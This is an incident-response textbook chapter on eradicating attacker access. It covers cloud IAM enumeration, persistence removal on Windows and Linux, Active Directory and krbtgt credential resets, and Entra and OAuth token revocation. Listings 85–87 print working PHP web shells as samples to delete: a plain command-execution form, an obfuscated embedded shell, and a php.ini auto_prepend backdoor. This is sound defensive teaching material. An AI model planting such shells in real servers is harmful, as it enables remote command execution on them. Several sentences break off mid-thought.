# Chapter 13-3: Eradication: Identity Credential Reset, Key Rotation & Access Revocation

> Modular Sub-Chapter | Source: DAIR-IR Framework

---

Each cloud provider has different mechanisms for cross-account or cross-tenant trust relationships. Table 27 summarizes equivalent commands for investigating role and permission assignments across providers.

Table 27 | Cloud Role and Trust Enumeration Quick Reference

List role assignments and permissions
AWS aws iam list-roles and aws iam list-attached-role-policies --role-name <role>
Azure az role assignment list --all --query "[].{Principal:principalName,
Role:roleDefinitionName, Scope:scope}"
GCP gcloud projects get-iam-policy <project-id> --format=json
Identify cross-account or cross-tenant trust
AWS aws iam list-roles | jq '.Roles[].AssumeRolePolicyDocument' (inspect trust policies for
external principals)
Azure az ad sp list --query "[?appOwnerOrganizationId!='<tenant-id>']" (list service principals
from external tenants)
GCP gcloud projects get-iam-policy <project-id> | grep -E
'serviceAccount:.*iam.gserviceaccount.com' (identify external service accounts)

Pay particular attention to privileged roles and roles with permissions to modify IAM itself (iam:PutRolePolicy, iam:AttachUserPolicy, iam:CreateRole, iam:UpdateAssumeRolePolicy, etc.), as these permissions allow attackers to continuously create new persistence mechanisms as long as they retain access to the cloud environment.

Infrastructure Investigation

For the infrastructure itself (virtual machines, containers, storage, databases, etc.), apply the same forensic procedures used in on-premises environments. The important difference is that cloud environments offer additional capabilities for evidence preservation, such as snapshots and logging. Examine virtual machine and container images for backdoors and persistence. Attackers often modify VM images or container images stored in registries to ensure that newly deployed instances automatically include backdoors. Review recent changes to images in the environment, using differential analysis with known-good baselines (such as gold images used for automated deployments). Analyze storage access and potential data exfiltration.  Cloud storage services like S3, Azure Blob Storage, and Google Cloud Storage are common targets. Review storage access logs to identify which objects were accessed, downloaded, or had permissions modified. Check for publicly exposed buckets or containers that the attacker may have configured to enable anonymous access.  Use the cloud provider’s native tools to evaluate aggregate logging data, or use command line tools to analyze access patterns as shown in Listing 82. [22]

Listing 82 | AWS S3 Log Analysis with s3logparse.py

$ s3logparse.py
s3logparse.py: Extract useful information from AWS S3 logs.
Usage: ./s3logparse.py [useragent|toptalkers|topuploaders|topdownloaders|topfiles] <log files>
$ s3logparse.py useragent ../mys3logs/* | cut -c 1-72
34140 - aws-cli/1.16.192 Python/2.7.10 Darwin/18.7.0 botocore/1.12.182 1
876 - Amazon CloudFront
222 - Cyberduck/7.1.1.31577 (Mac OS X/10.14.6) (x86_64)
69 - S3Console/0.4, aws-internal/3 aws-sdk-java/1.11.915 Linux/4.9.230-0
44 - S3Console/0.4, aws-internal/3 aws-sdk-java/1.11.991 Linux/5.4.109-5
[...]
$ s3logparse.py toptalkers ../mys3logs/*
13.80 GiB - 252.59.250.11
12.85 GiB - 251.252.12.173
12.81 GiB - 251.252.12.190
[...]
1 The most frequent user agent accessing the S3 bucket is AWS CLI, indicating scripted access.
2 IP address with the highest data transfer volume from the S3 bucket logging data.
Investigate serverless functions and event-driven infrastructure. Attackers can deploy malicious serverless
functions that execute in response to triggers, providing persistent access without traditional compute
infrastructure. Review recently deployed or modified functions, examining their code for backdoors and
their triggers for unexpected event sources. Check IAM roles for excessive permissions that could enable
privilege escalation or lateral movement.

Review network configurations and security group modifications. Attackers modify firewall rules, security groups, and network ACLs to enable access to compromised resources or to establish command-and-control channels. Check VPC peering connections, VPN configurations, and transit gateway attachments that could enable lateral movement to other cloud environments or on-premises networks.

SaaS Investigation and Eradication

Software-as-a-Service compromises typically involve account takeover, OAuth token abuse, and exploitation of application-level access controls rather than traditional infrastructure compromise. These compromises are particularly difficult to investigate, since affected organizations lack access to the underlying infrastructure to collect logs or forensic images from the SaaS provider. Further, many smaller SaaS providers have limited logging capabilities, making it challenging to reconstruct attacker activity. Organizations often have to rely on minimal insight from the SaaS provider combined with logs from their own integrated systems to piece together the attacker’s actions.

When investigating an incident involving a SaaS provider, start by identifying the provider’s logging capabilities. Major platforms such as Microsoft 365, Google Workspace, and Salesforce provide audit logs via administrative consoles or APIs. Smaller or specialized SaaS applications may have minimal logging, or logs may only be available by opening a support case with the provider. Request activity reports and access logs covering the compromise timeframe, and specifically ask whether any additional logging data is available beyond standard administrative interfaces.

Use integration logging from on-premises or IaaS environments connected to the SaaS platform. Organizations often connect SaaS applications to internal systems via APIs, webhooks, or other middleware. These integration points may capture request logs, authentication events, or data transfer records that provide insight into attacker activity even when the SaaS platform’s native logging is limited. Review logs from identity providers, API gateways, SIEM systems, and any custom integration services that interact with the compromised SaaS application.

Enumerate SaaS privileges to identify persistence mechanisms and excessive permissions. Attackers frequently create new administrative accounts, elevate privileges on compromised accounts, create API keys, or grant OAuth consent to malicious applications. Review user roles and permissions, looking for recently modified access levels or accounts with administrative privileges that don’t align with job responsibilities. Examine OAuth applications and third-party integrations, identifying any applications that were consented to during the compromise timeframe or applications that have suspicious permission scopes.

MIDNIGHT BLIZZARD OAUTH CAMPAIGN

In January 2024, Microsoft disclosed that Midnight Blizzard (also known as NOBELIUM), a Russian state-sponsored threat actor, had compromised Microsoft’s corporate environment through OAuth application abuse. [23] The attackers gained initial access by password-spraying a legacy, non-production tenant account that did not have multi-factor authentication. From this initial access, the attackers gained access to a legacy test OAuth application that had elevated access to Microsoft’s corporate environment. Using this OAuth application’s permissions, the attackers requested access tokens with powerful Microsoft Graph API scopes including Directory.ReadWrite.All, RoleManagement.ReadWrite.Directory, Application.ReadWrite.All, and AppRoleAssignment.ReadWrite.All. [24]

Figure 107 | Microsoft Legacy Test Application

With these permissions, the attackers created a new user account in Microsoft’s corporate tenant and assigned it Global Administrator privileges. With their new privileged access, they created additional malicious OAuth applications and used the compromised admin account to grant these applications full_access_as_app permission to Microsoft 365 services including Microsoft Exchange Online. This permission provided unrestricted access to corporate mailboxes, allowing the attackers to exfiltrate emails from senior leadership and employees in cybersecurity and legal functions. The Midnight Blizzard campaign illustrates why SaaS eradication requires identifying and revoking OAuth applications, API permissions, and service principals rather than simply resetting user passwords. The attackers maintained access via OAuth applications they controlled, allowing them to continue accessing Microsoft’s environment even if the initially compromised account’s password tenant.

Organizations responding to similar compromises should enumerate all OAuth applications and their permission scopes, identify applications created or modified during the attack timeframe, review consent grants for high-privilege permissions like full_access_as_app or Mail.ReadWrite, and audit service principal credentials that could provide persistent access independent of user accounts.

ERADICATE ATTACKER ACCESS

With the investigation complete (based on the current response actions loop), the response team transitions from understanding the compromise to eliminating it. The investigation revealed what the attacker did, how they maintained access, and what artifacts they left behind. Now, responders apply that knowledge to systematically remove every trace of the attacker’s presence from the environment. Eradication actions fall into several categories, each addressing different aspects of attacker access. Persistence mechanism removal eliminates the footholds that allow attackers to maintain access across reboots and credential changes. Account and access remediation terminates active attacker sessions and removes unauthorized accounts they created. Credential rotation invalidates stolen authentication materials that would otherwise allow attackers to return. System restoration replaces compromised systems with known-good configurations when targeted cleanup cannot provide sufficient confidence. Vulnerability remediation closes the security gaps that enabled the initial compromise and any weaknesses the attacker exploited during lateral movement. Finally, defense-in-depth controls introduce additional security layers to detect and prevent similar attacks in the future.

Figure 108 | Eradicate Attacker Access Process

Continue to monitor systems following removal to detect reappearance. Persistence mechanisms that return after removal indicate missed components, malicious processes that evaded detection, or reinfection through an attack vector.

Windows Persistence Removal Considerations

Windows systems provide numerous persistence locations that attackers exploit. The specific locations used vary by attacker sophistication and the privileges they obtained during the compromise. Responders should address each category systematically, using insights from the investigation to guide removal efforts. Windows persistence mechanisms span registry Run keys, scheduled tasks, services, WMI event subscriptions, startup folders, and numerous other locations. The Sysinternals Autoruns utility allows analysts to enumerate multiple persistence mechanisms on a system in a single view. Autoruns displays entries from dozens of persistence locations and highlights items that may be suspicious based on signature verification and VirusTotal integration, as shown in Figure 109.

Figure 109 | Sysinternals Autoruns Persistence Enumeration

Export the Autoruns results to a file for documentation before making changes, using the GUI File | Save feature or the command line version autorunsc.exe to produce a CSV file, as shown in Listing 83. Compare the output against a known-good baseline from a clean system of the same configuration to identify entries that should not be present.

The Autoruns GUI can save the analysis to an Autoruns file ( .arn), which can be opened on a separate analysis system for additional investigation.

Listing 83 | Exporting Autoruns CSV Results for Analysis

PS C:\Users\ttidmas> C:\tools\Sysinternals\autorunsc.exe -nobanner -c -o autoruns-ws1-ttidmas-20251201.txt
PS C:\Users\ttidmas> Get-Content .\autoruns-ws1-ttidmas-20251201.txt | Select-Object -First 4
Time,Entry Location,Entry,Enabled,Category,Profile,Description,Company,Image Path,Version,Launch
String
12/7/2019 9:15 AM,HKLM\System\CurrentControlSet\Control\Terminal
Server\Wds\rdpwd\StartupPrograms,,,"Logon",System-wide,,,,,,
1/26/2007 2:00 AM,"HKLM\System\CurrentControlSet\Control\Terminal
Server\Wds\rdpwd\StartupPrograms","rdpclip",enabled,"Logon",System-wide,"RDP Clipboard
Monitor","Microsoft Corporation","c:\windows\system32\rdpclip.exe",10.0.19041.746,"rdpclip"
11/30/2025 1:49 PM,HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Winlogon\Userinit,,,"Logon",System-wide,,,,,,

After identifying malicious persistence through Autoruns or investigation techniques, remove each mechanism using the appropriate method for its type. Persistence mechanisms identified in Autoruns can be removed from within the Autoruns GUI. Alternatively, use PowerShell to remove persistence mechanisms manually, as shown in Listing 84.

Listing 84 | Removing a Malicious Windows Service

PS C:\> Get-Service "Evast Updater"
Status   Name               DisplayName
------   ----               -----------
Running  Evast Updater      fznRlhbehmol
PS C:\> Set-Service -Name "Evast Updater" -StartupType Disabled 1
PS C:\> Stop-Service "Evast Updater" -Force
PS C:\> sc.exe delete "Evast Updater"
[SC] DeleteService SUCCESS
PS C:\> Get-Service "Evast Updater" -ErrorAction SilentlyContinue 2
PS C:\>
1 Disable the service before stopping and removing it to prevent an automatic restart.
2 The verification command should return no results if the removal succeeded.

The removal sequence first disables the service to prevent a restart, then stops the service, and finally deletes the service registration entirely. Using sc.exe delete  rather than PowerShell’s Remove-Service

Linux Persistence Removal Considerations

Linux systems provide different persistence mechanisms than Windows, but the systematic approach to removal remains the same. Use the persistence inventory from investigation to guide removal, addressing all identified mechanisms as part of coordinated eradication. Table 28 summarizes several common Linux persistence types and their removal methods.

Wherever possible, run the persistence enumeration and removal commands as root for comprehensive results.

Table 28 | Linux Persistence Types and Removal Methods

LINUX PERSISTENCE
TYPE
REMOVAL METHOD
At Jobs List with atq, remove with atrm <job_number>
Cron Jobs Use crontab -r or edit system cron files to remove malicious entries
Git Hooks Remove or sanitize hook scripts in .git/hooks/ directories
Library Hijacking Remove entries from /etc/ld.so.preload and check LD_PRELOAD in environment files
Malicious Kernel
Modules
Unload with rmmod or modprobe -r, delete .ko file, remove from /etc/modules or
/etc/modules-load.d/
PAM Backdoors Review and restore legitimate modules in /etc/pam.d/ and /lib/security/
Package
Manager Hooks
Check and clean /etc/apt/apt.conf.d/ or /etc/yum/pluginconf.d/
SSH Authorized
Keys
Edit ~/.ssh/authorized_keys (for each local user) to remove unauthorized keys
Sudo
Configuration

Review the output of sudo -l (for each local user), remove unauthorized Sudo entries with visudo SUID/SGID Binaries Remove the binary or clear the SUID/SGID bit with chmod u-s/chmod g-s Shell RC/Profile Files Remove malicious entries from .bashrc, .bash_profile, /etc/profile, /etc/profile.d/* Systemd Services Stop, disable, and delete unit files using systemctl commands Udev Rules Delete malicious rules from /etc/udev/rules.d/, then run udevadm control --reload Verify removal by listing the persistence mechanism using administrative commands such as atq and by listing the files in associated configuration directories such as /var/spool/at to confirm malicious entries no longer appear.

Web Shell Removal

Web shells provide attackers with interactive access to compromised web servers. Remove the web shell file and any associated configuration or log files the shell may have created. Investigation may have identified multiple web shells deployed for redundancy. Remove all identified shells as part of coordinated eradication. Web shells may be deployed as standalone files, as embedded content within existing web application files, or as configuration modifications that execute across multiple files. The example in Listing 85  shows a simple standalone web shell file that executes commands passed via the cmd GET parameter. Web shell eradication would involve deleting this file from the web server.

Listing 85 | Standalone Web Shell Backdoor File

/var/www/html $ cat imgupload.html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']); 1
}
?>
</pre>
</body>
</html>
1 Executes commands passed via the cmd GET parameter for remote command execution.

The example in Listing 86 shows an obfuscated web shell embedded within an HTML file. The HTML file is likely part of a larger web application, so eradication involves removing the obfuscated PHP code while preserving the rest of the HTML content.

Listing 86 | Obfuscated Web Shell Embedded in HTML File

/var/www/html $ tail -5 index.html
<script src="assets/js/main.js"></script>
</body>
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-
40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];ech
o`$_`?> 1
</html>
reverting the configuration change and deleting the backdoor script.

Listing 87 | Web Shell via Configuration Modification

/var/www/html $ tail -4 /etc/php7/php.ini
; Local Variables:
; tab-width: 4
; End:
auto_prepend_file = /etc/php7/runmeconfig.php
/var/www/html $ cat /etc/php7/runmeconfig.php
<?php if(isset($_GET['runme'])) { system($_GET['runme']); } ?> 1
1 Configuration-level web shell persistence mechanism.

After removing web shell content, restart the web server to clear any in-memory artifacts that might persist after file deletion. Some web shells load components into memory that continue executing even after the file is removed.

Web shells can exist at the web-server layer, but also at the web application layer, requiring a comprehensive investigation of application code, plugins, and modules to identify and remove all instances.

Cloud Persistence Removal

Cloud environments present unique persistence challenges because attackers can create resources that execute code without traditional host-based persistence. The investigation should have identified unauthorized cloud resources, IAM modifications, and changes to container images. Eradication now focuses on removing these cloud-native persistence mechanisms.

Lambda/Serverless Functions

Serverless functions allow attackers to execute code without managing servers, making them attractive for persistence. Delete malicious functions identified during the investigation using the cloud provider’s CLI tools.

Table 29 | Removing Malicious Serverless Functions from Major Cloud Providers

CLOUD PROVIDER REMOVAL COMMAND
AWS aws lambda delete-function --function-name MaliciousFunction
Azure az functionapp delete --name MaliciousFunctionApp --resource-group
ResourceGroup
Google gcloud functions delete malicious-function --region us-central1

After deleting functions, review CloudTrail, Azure Activity Log, or Cloud Audit Logs to confirm the deletion was successful. Check for associated triggers such as API Gateway endpoints, S3 event notifications, or CloudWatch Events rules that may need to be removed.

IAM Policy Modifications

IAM changes represent a particularly insidious form of cloud persistence because they grant access rather than execute code directly. Attackers who modify IAM policies can grant themselves persistent access across cloud accounts that will survive even comprehensive credential rotation. Revert unauthorized IAM policy changes by comparing current policies against the baseline configuration established before the incident. If the organization uses infrastructure-as-code, the IaC repository provides a definitive baseline for comparison. Remove unauthorized users and service principals that the attacker created to maintain access. Revoke elevated permissions granted during the compromise, particularly administrative roles assigned to standard user accounts or overly permissive policies attached to existing roles. Reset access keys for compromised accounts to invalidate any credentials the attacker may have stolen.

Container Image Modifications

Container images provide another vector for cloud persistence. Attackers who modify container images ensure their code executes whenever new containers are deployed from those images. This persistence survives container restarts, scaling events, and even cluster redeployment if the compromised images remain in use.

Remove manipulated images from both local Docker hosts and container registries. After removing images from registries, force redeployment of affected workloads to ensure running containers are replaced with instances from known-good images. Review CI/CD pipelines to ensure they build from trusted base images and that build processes have not been compromised.

Account and Identity Remediation

Account and identity remediation addresses the authentication and authorization materials that provide access to compromised systems and connected services. It is an important element for fully eradicating attacker access. Failure to remediate identity compromise leaves attackers an opportunity to regain access even after persistence mechanisms are removed. Effective identity remediation follows a structured approach rather than disorganized credential resets.

Modern identity systems are complex, with multiple authorization paths that attackers can exploit. Even a single workstation compromise can have cascading effects requiring account and identity remediation across multiple systems, including local accounts, Active Directory, federated identity providers, cloud identity platforms, and SaaS applications. This section examines important considerations for effective account and identity remediation, though organizations should adapt these principles to their specific identity architectures.

When identity remediation requires creating replacement accounts (for example, new privileged accounts for severe compromises or temporary accounts during phased resets), Following an investigation, remove unauthorized local user accounts to prevent them from being used for continued access.

Always verify that an account is not required before removal.

Locally created unauthorized user accounts on Windows can be removed using Windows administrative GUI tools or PowerShell commands as shown in Listing 88. Following the removal of an account, verify that it no longer exists by attempting to retrieve it again.

Listing 88 | Removing Unauthorized Local Windows Account

PS C:\WINDOWS\system32> Get-LocalUser EVASTUtilityAccount
Name                Enabled Description
----                ------- -----------
EVASTUtilityAccount True
PS C:\WINDOWS\system32> Get-LocalUser EVASTUtilityAccount | Remove-LocalUser 1
PS C:\WINDOWS\system32> Get-LocalUser EVASTUtilityAccount -ErrorAction SilentlyContinue 2
PS C:\WINDOWS\system32>
1 Remove the local user account.
2 The verification command should return no results if the removal was successful.
Similarly, on Linux systems, analysts can remove unauthorized local user accounts using the userdel
command, as shown in Listing 89.

Listing 89 | Removing Unauthorized Local Linux Account

$ grep apache2 /etc/passwd
apache2:x:1000:1000:Apache Service Account,,,:/home/apache2:/bin/bash
$ sudo userdel -r apache2
userdel: apache2 mail spool (/var/mail/apache2) not found 1
$ grep apache2 /etc/passwd 2
$
1 The warning indicates that no mail spool exists for the user.
2 The verification command should return no results if the removal succeeded.

In the example in Listing 89, the -r argument removes the user’s home directory, the mail spool, and the account itself. It is important to collect evidence from the user’s home directory during the containment activity before running this command. These steps are straightforward: identify the unauthorized local accounts, remove them, and verify removal. However, organizations with complex identity environments, including Windows Active Directory, Entra, and other identity providers, should take a more structured approach to account and credential remediation.

Active Directory Account and Credential Remediation

Attackers who compromise Active Directory infrastructure can gain access to cryptographic materials that allow them to forge authentication tokens, persist across password resets, and maintain access through multiple authorization paths. Simply resetting passwords for known-compromised accounts is insufficient. Attackers who obtain privileged credentials or authentication secrets can continue accessing systems until those underlying key materials are changed.

A credential reset after an Active Directory compromise requires a structured, phased approach rather than a single mass reset. Execute credential resets in phases aligned with account privilege levels (tier 0 through tier 2) and infrastructure criticality.

Microsoft’s tier model for enterprise access defines three account tiers: tier 0 (domain admins, enterprise admins, schema admins), tier 1 (server and application admins), and tier 2 (workstation users). [25]

Phase 1: Privileged Account Reset Reset credentials for all Tier-0 and Tier-1 privileged accounts first. These accounts provide the greatest access and represent the highest risk if attackers retained copies of the credentials. Privileged accounts requiring immediate reset include:

• Built-in Administrator accounts on domain controllers and member servers.

• Domain Admins, Enterprise Admins, and Schema Admins group members.

• Backup Operators and other groups with effective administrative rights.

• Service accounts for identity infrastructure, including AD FS, Entra Connect, and certificate services.

• Any other accounts with effective domain admin privileges through nested group membership or delegated permissions.

Before or concurrently with privileged account resets, analysts should reduce privileged group memberships to the minimum required. Remove any unauthorized members from Domain Admins, Enterprise Admins, Backup Operators, and similar groups.

Listing 90 | Eradicate Unauthorized Domain Admin Group Membership

PS C:\> Remove-ADGroupMember -Identity "Domain Admins" -Members "ttidmas" -Confirm:$false
PS C:\> $cred = Get-Credential "CORP\ttidmas"
cmdlet Get-Credential at command pipeline position 1
Supply values for the following parameters:
Credential
Password for user CORP\ttidmas: ********
PS C:\> Set-ADAccountPassword -Identity "ttidmas" -Reset -NewPassword $cred.Password
PS C:\> Set-ADUser -Identity "ttidmas" -ChangePasswordAtLogon $true
PS C:\>

ACCOUNT RECREATION VS. PASSWORD RESET FOR SEVERE COMPROMISES

In severe Active Directory compromises where attackers have domain controller access, DCSync capability, or prolonged undetected access, Microsoft recommends creating entirely new privileged accounts rather than resetting existing ones. The rationale for account recreation is that existing account objects may have been modified in ways that are difficult to detect. Attackers may have added Service Principal Names (SPNs), modified account attributes, or established persistence mechanisms tied to specific account SIDs. Creating new accounts provides a clean break from any potential compromise of the account object itself, beyond credentials alone. [26] Microsoft’s approach recommends that administrators create new tier 0 accounts first, verify that they function correctly, then disable (not delete) the old accounts and move them to a dedicated OU for quarantine. This sequencing maintains administrative access throughout the transition and preserves old accounts for forensic analysis.

Figure 110 | Microsoft’s Account Recreation Approach

However, this approach has disadvantages. It adds significant complexity to an already challenging recovery process. Application dependencies, group memberships, and delegated permissions should be recreated for new accounts. Service accounts with hardcoded SIDs in application configurations may also require application changes.

For many organizations, particularly those without mature identity management practices, the operational risk of account recreation may outweigh the security benefits. Account recreation is most appropriate when the investigation confirms or strongly suggests the attacker had the access and time to modify domain account objects, or when the organization cannot determine with confidence what the attacker accessed. For compromises limited to credential theft without domain controller access, password resets combined with krbtgt rotation typically provide sufficient remediation.

Phase 2: Service Account and Identity Infrastructure Reset Reset credentials for service accounts and identity infrastructure components. These accounts often have broad access across the environment and may be targeted for persistence. Service accounts requiring reset include directory synchronization accounts, certificate authority service accounts, database service accounts, and application service accounts that authenticated to compromised systems. Coordinate with application teams to update service configurations before the reset takes effect. For identity infrastructure accounts, pay particular attention to:

• Entra Connect synchronization accounts

• AD FS service accounts and certificates

• Certificate Services (AD CS) service accounts

• Any accounts used for federation or identity bridging Phase 3: General User Account Reset After privileged and service accounts are secured, execute a staged reset of remaining user accounts.

Prioritize targeted users and accounts with broad data access before the general user population. Plan for user impact during mass credential resets. Prepare helpdesk staff for increased support volume. Use self-service password reset (SSPR) with strong identity proofing where possible to reduce administrative burden. Communicate the reset timeline to affected users in advance. Credential resets prevent attackers from using stolen passwords for future authentication attempts. However, password resets alone do not revoke existing sessions or invalidate tokens issued before the reset. Attackers who established sessions or obtained tokens before the password change can continue using those authorization materials until they expire or are explicitly revoked. Responders need to take additional steps to address cryptographic root rotation, session revocation, and hybrid identity remediation.

Krbtgt Account Reset

The krbtgt account (sometimes capitalized as KRBTGT in Microsoft documentation) is the cryptographic root of trust for Kerberos authentication in Active Directory. Attackers who obtain the krbtgt hash can forge Golden Tickets that grant access to any resource in the domain. [27] The krbtgt account maintains a password history of two. The first reset invalidates tickets issued with the oldest stored key. The second reset invalidates tickets issued with the key that was current at the time of compromise.

Reset the krbtgt password using Active Directory Users and Computers or PowerShell, as shown in Listing 91.

Listing 91 | Resetting the krbtgt Account Password

PS C:\> Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString
-AsPlainText "initialresetpassword" -Force)
PS C:\> repadmin /replsum
Replication Summary Start: 2025-12-14 09:32:10
Source DSA          largest delta    fails/total    %%   error
FM-SRV-DC01          00h:12m:33s        0 /   12     0
FM-SRV-FS01          00h:10m:51s        0 /   12     0
FM-NET-FW01          00h:09m:14s        0 /   12     0
Destination DSA     largest delta    fails/total    %%   error
FM-SRV-DC01          00h:12m:33s        0 /   12     0
FM-SRV-FS01          00h:10m:51s        0 /   12     0
FM-NET-FW01          00h:09m:14s        0 /   12     0
Replication Summary End: 2025-12-14 09:32:12

The password you specify when setting the krbtgt user password is not significant since the domain generates a strong password automatically, independent of the one you provided.

Wait at least the maximum Kerberos ticket lifetime (default ten hours) between the first and second resets. This delay allows legitimately issued tickets to expire naturally before the second reset invalidates the key they were issued under. In practice, administrators may want to wait longer, perhaps twenty-four to forty-eight hours, to account for systems that may be offline so that they can receive updates when they reconnect.

Verify replication completed successfully after each reset using repadmin /replsum  before proceeding. Incomplete replication can result in authentication failures when users authenticate against domain controllers with inconsistent krbtgt keys.

Multi-Domain Forest Considerations

In multi-domain forests, reset krbtgt in child domains before resetting it in parent domains. Each domain has its own krbtgt account, and the reset sequence should follow trust relationships. Perform two resets per domain, with appropriate delays, and verify replication between each reset.

Domain Controller Machine Account Reset

Domain controllers authenticate to each other using machine account passwords. Attackers who compromise domain controllers may have obtained machine account credentials, allowing them to impersonate domain controllers even after other remediation steps are complete. As part of the eradication effort, reset the domain controller machine account passwords individually after completing krbtgt resets. Use netdom to reset each domain controller’s machine account password:

Listing 92 | Resetting Domain Controller Machine Account Password

PS C:\> netdom resetpwd /server:FM-SRV-DC01 /userd:FALSIMENTIS\Administrator /passwordd:* 1
Type the password associated with the domain user: ************

The machine account password for the local machine has been successfully reset. The command completed successfully.

PS C:\>

1 The second d in /passwordd is used to distinguish the domain password from a local account.

Execute this command on each domain controller, specifying a different domain controller as the /server target. The /passwordd:* parameter prompts for the password interactively rather than exposing it on the

Listing 93 | Identifying Unconstrained Delegation in Active Directory

PS C:\> Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Name          DNSHostName                    TrustedForDelegation
----          -----------                    --------------------
FM-SRV-DC01   FM-SRV-DC01.falsimentis.local  True
FM-SRV-FS01   FM-SRV-FS01.falsimentis.local  True
FM-WEBDEV     FM-WEBDEV.falsimentis.local    True
PS C:\> Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation 1
DistinguishedName                              SamAccountName
-----------------                              --------------
CN=svcWebKrb,CN=Users,DC=falsimentis,DC=local  svcWebKrb 2
PS C:\>
1 Output from this command is modified for space considerations.
2 svcWebKrb is a user account with unconstrained delegation enabled.

For objects that no longer require delegation, disable the setting, as shown in Listing 94.

Listing 94 | Disabling Unconstrained Delegation

PS C:\> Set-ADComputer -Identity "FM-WEBDEV" -TrustedForDelegation $false
PS C:\> Set-ADUser -Identity "svcwebkrb" -TrustedForDelegation $false
PS C:\>
Where delegation is required for application functionality, migrate to constrained delegation or resource-based constrained delegation, which restricts the services to which an account can delegate user access.
Constrained delegation provides equivalent functionality while substantially reducing the attack surface.

Hybrid and Entra ID Remediation

Organizations with hybrid Active Directory and Entra ID environments face additional remediation requirements. Password resets in on-premises Active Directory do not automatically revoke cloud sessions, and attackers who compromised hybrid identity infrastructure may have established persistence in both environments.

Hybrid identity remediation combines on-premises credential resets with cloud session revocation and conditional access enforcement. The goal is to ensure attackers cannot reauthenticate from compromised devices after credentials are reset.

Entra ID Session and Token Revocation

Revoke all refresh tokens and active sessions for compromised users in Entra ID. This forces re-authentication for all cloud applications the next time they attempt to use stored tokens. Password reset alone is insufficient because existing tokens remain valid until they expire or are explicitly revoked. Revoke user sessions using the Microsoft Graph PowerShell SDK or through the Entra admin center. Using PowerShell, revoke all refresh tokens for a compromised user as shown in Listing 95.

Listing 95 | Revoke Entra ID User Sessions

PS C:\> Connect-MgGraph -Scopes "User.ReadWrite.All"
Welcome To Microsoft Graph!
PS C:\>
PS C:\> Revoke-MgUserSignInSession -UserId "ttidmas@falsimentis.com"
Id                                   DisplayName   UserPrincipalName
--                                   -----------   -----------------
d13a91fb-4b4c-43c8-9034-3ae8947c3121 Tamra Tidmas  ttidmas@falsimentis.com
PS C:\>
Alternatively, in the Entra admin center, navigate to Identity | Users | [select user] | Revoke sessions  to
invalidate all refresh tokens for the user.

For compromised user accounts, revoke all refresh tokens immediately after resetting their passwords. If investigation suggests the attacker can complete self-service password reset or MFA challenges, block the user entirely by disabling their account as shown in Listing 96.

Listing 96 | Disable Entra ID User Account

PS C:\> Update-MgUser -UserId "ttidmas@falsimentis.com" -AccountEnabled:$false
Alternatively, in the Entra admin center, navigate to Identity > Users > [select user] > Properties  and set
Block sign in to Yes to disable the account.

Some Entra integration applications support back-channel logout, which actively notifies connected applications to terminate sessions when an administrator revokes access. Without back-channel logout support, application sessions may remain active until their tokens expire naturally, even after the identity provider session is terminated. For applications that do not support back-channel logout, manually terminate sessions through each application’s administrative interface.

THE FOUR-MONTH ZOMBIE ACCOUNT

A cybersecurity consultant shared a cautionary tale about the persistence of cached credentials and long-lived tokens. [29] “After some initial logon issues, I (completely by accident) found I could access everything much more quickly by bypassing their corporate VPN first.

The consultant continued working normally for months. Then came a security audit. “After about ten months, I got security audited, and it turned out my account had been deactivated by mistake four months earlier.

Four months of continued access to enterprise systems, despite the account being disabled. How was this possible? “My unwitting combination of full admin rights on my machine, cached credentials, and not signing in via their VPN had allowed me to keep working despite, in theory, having zero access. The organization believed it had strict access controls in place. They disabled the account through their identity provider. But the combination of cached credentials on an unmanaged device, bypassing the VPN enforcement point, and long-lived access tokens meant the revocation never took effect.

This scenario illustrates why session and token revocation are essential during incident response. Disabling an account or resetting a password addresses future authentication attempts, but does nothing about existing sessions and cached credentials. An attacker with a compromised device in this environment could maintain access for months after the organization believed it had revoked it.

Entra Connect and Directory Synchronization

If Entra Connect or another directory synchronization service is compromised, reset the synchronization service account credentials and review the synchronization configuration for unauthorized changes. Attackers who compromise directory synchronization can modify cloud identities, create backdoor accounts for persistent access, or alter group memberships that propagate to the cloud environment. Verify that synchronization rules have not been modified and that no unauthorized objects are being synchronized.

Review the Entra Connect synchronization service account in the Entra admin center under Identity | Hybrid management | Microsoft Entra Connect | Connect Sync . Reset the service account credentials and verify the connector configuration. On the Entra Connect server, open the Synchronization Rules Editor to review inbound and outbound synchronization rules for unauthorized modifications.

Session and Token Revocation

Modern authentication creates session tokens, refresh tokens, and OAuth grants that persist independently of password changes. When a user authenticates through single sign-on, they receive tokens for each connected application that may remain valid for hours, days, or indefinitely, depending on configuration. Attackers who compromise accounts with SSO access can use stolen tokens to access connected applications even after the password is changed. Browser sessions, OAuth tokens, personal access tokens, and API keys all provide access paths that persist even after credential rotation. Comprehensive account remediation requires revoking all active sessions and tokens associated with compromised accounts. Revoke refresh tokens and active sessions through each identity provider in use. Most identity platforms provide administrative capabilities to terminate all sessions for a specific user. This forces reauthentication for all connected applications the next time they attempt to use stored tokens. For applications that do not receive logout notifications from the identity provider, manually terminate sessions through each application’s administrative interface. Prioritize applications that contain sensitive data or provide access to critical infrastructure. Review the application inventory developed during the investigation to ensure all connected applications are addressed.

OAuth Application and Consent Revocation

Attackers may have activated malicious OAuth applications that provide persistent access to user data and connected services. These applications receive delegated permissions that remain valid even after password changes and session termination.

Review OAuth applications authorized by compromised accounts and revoke any unauthorized consents. Focus on applications with broad permissions such as mail access, file access, or administrative capabilities. Legitimate-looking application names may mask malicious OAuth grants. Verify each application against known authorized applications. Apply this process to all affected identity providers and SaaS platforms involved with the incident.

For example, GitHub is a platform where third-party applications can provide persistent access through OAuth grants. Attackers who create malicious GitHub applications and add them to repositories or organization-level assets maintain persistent API access even after credential resets and token revocation. Analysts should review GitHub app integrations (as shown in Figure 111) and the permissions and repository access granted to each application (as shown in Figure 112 ) to identify and remove any unauthorized

Figure 111 | GitHub App Integration Example

Figure 112 | GitHub App Integration Permissions and Access

Personal Access Tokens and Long-Lived Credentials

